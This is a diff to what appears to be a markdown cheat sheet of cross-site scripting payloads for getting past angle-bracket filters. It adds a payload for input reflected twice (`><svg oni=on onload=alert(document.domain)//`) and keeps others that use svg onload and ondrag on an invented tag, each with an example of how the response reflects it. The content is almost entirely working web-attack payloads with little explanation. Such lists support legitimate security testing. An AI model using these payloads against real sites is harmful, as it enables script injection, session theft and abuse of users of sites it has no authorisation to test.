@@ -45,7 +45,12 @@ For Attribute context use:
 * When `>` is present somewhere after our payload in response page:
 
 `<svg oni=on onload=alert(1)//` e.g reflected as `<svg oni=on onload=alert(1)//</h2>` (Crafted on `February 01, 2022`)
-* Situation: No `>` is present after our payload anywhere in response body and at the same time when `>` is not allowed as its allowed in previous payloads, inexistent tag can be provided for xss:
+
+* When user input is reflected twice and `>` is disallowed for valid existent tags and `>` is not present in response body:
+
+`><svg oni=on onload=alert(document.domain)//` will e.g get reflected as `Found ><svg oni=on onload=alert(document.domain)//{"><svg oni=on onload=alert(document.domain)\/\/":null}` and XSS will trigger.
+
+* When `>` is not present after our payload anywhere in response body and at the same time when `>` is not allowed as its allowed in previous payloads, inexistent tag can be provided for xss:
 
 `<o oni=on ondrag=alert(1)>Drag Me` e.g reflected as `<o oni=on ondrag=alert(1)>Drag Me no left angle bracket present here` -> then highlight text and drag it to trigger XSS (Crafted on `February 01, 2022`)
 
